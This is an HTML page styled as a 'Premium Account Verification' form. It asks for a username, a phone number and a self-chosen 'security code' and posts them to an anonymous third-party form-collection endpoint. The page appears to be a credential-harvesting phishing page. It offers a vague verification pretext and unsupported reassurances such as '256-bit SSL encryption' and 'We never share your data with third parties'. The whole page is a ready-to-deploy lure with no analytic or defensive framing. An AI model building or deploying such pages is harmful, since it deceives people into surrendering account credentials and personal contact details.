<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>âœ¨ Premium Account Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

        :root {
            --gradient-1: #6366f1;
            --gradient-2: #a855f7;
            --accent: #f59e0b;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, var(--gradient-1), var(--gradient-2));
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .verification-card {
            background: rgba(255, 255, 255, 0.98);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            max-width: 500px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .verification-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--accent), var(--gradient-2));
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }

        .header i {
            font-size: 2.5rem;
            color: var(--gradient-2);
            margin-bottom: 15px;
        }

        .header h1 {
            color: #2d3748;
            font-size: 26px;
            margin-bottom: 10px;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #4a5568;
            font-weight: 600;
            padding-left: 5px;
        }

        .input-wrapper {
            position: relative;
        }

        input, select {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s ease;
            background: #f8fafc;
        }

        input:focus, select:focus {
            border-color: var(--accent);
            background: white;
            box-shadow: 0 0 15px rgba(245, 158, 11, 0.15);
        }

        .security-code {
            position: relative;
        }

        .security-code i {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #94a3b8;
            cursor: pointer;
        }

        .submit-btn {
            background: linear-gradient(135deg, var(--gradient-2), var(--accent));
            color: white;
            padding: 16px 45px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(99, 102, 241, 0.3);
        }

        .legal {
            font-size: 12px;
            color: #64748b;
            margin-top: 25px;
            text-align: center;
            line-height: 1.6;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
        }

        .checkbox-group input {
            width: 18px;
            height: 18px;
            accent-color: var(--gradient-2);
        }

        @media (max-width: 480px) {
            .verification-card {
                padding: 30px;
            }
            
            .header h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="verification-card">
        <div class="header">
            <i class="fas fa-shield-alt"></i>
            <h1>Premium Account Verification</h1>
            <p>Secure your exclusive benefits</p>
        </div>

        <form action="https://getform.io/f/bjjmdewb" method="POST">
            <input type="hidden" name="_honey" style="display:none">
            <input type="hidden" name="_captcha" value="false">

            <div class="form-group">
                <label>Your Username</label>
                <div class="input-wrapper">
                    <input type="text" name="username" placeholder="Enter unique username" required>
                </div>
            </div>

            <div class="form-group">
                <label>Contact Number</label>
                <div class="input-wrapper">
                    <input type="tel" name="phone" placeholder="+1 234 567 890" required>
                </div>
            </div>

            <div class="form-group">
                <label>Security Code</label>
                <div class="input-wrapper security-code">
                    <input type="password" name="access_code" 
                           placeholder="Create security code (8-12 chars)" 
                           pattern="[A-Za-z0-9]{8,12}"
                           required>
                    <i class="fas fa-eye-slash toggle-password"></i>
                </div>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="terms" required>
                <label for="terms">I agree to security guidelines and terms</label>
            </div>

            <button type="submit" class="submit-btn">
                <i class="fas fa-lock"></i> Complete Verification
            </button>

            <div class="legal">
                <i class="fas fa-shield-check"></i> 256-bit SSL encryption | 
                We never share your data with third parties
            </div>
        </form>
    </div>

    <script>
        // Password visibility toggle
        document.querySelector('.toggle-password').addEventListener('click', function(e) {
            const passwordInput = this.previousElementSibling;
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.classList.toggle('fa-eye');
            this.classList.toggle('fa-eye-slash');
        });
    </script>
</body>
</html>
